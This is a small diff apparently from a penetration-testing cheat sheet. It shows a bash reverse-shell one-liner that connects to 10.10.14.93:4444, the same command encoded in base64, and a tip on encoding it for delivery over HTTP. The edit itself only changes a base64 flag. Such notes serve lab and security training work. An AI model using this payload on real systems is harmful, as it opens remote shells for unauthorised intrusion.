@@ -47,7 +47,7 @@ Download reverse shell file and imediately execute it
 
 Converte shell to base64 when sending it through http:
 
-	echo -n 'bash -i >& /dev/tcp/10.10.14.93/4444 0>&1' | base64 -w0
+	echo -n 'bash -i >& /dev/tcp/10.10.14.93/4444 0>&1' | base64 -w 0
 	YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45My80NDQ0IDA+JjE=
 
 	To get rid of the special characters like the plus sign just add double splaces:
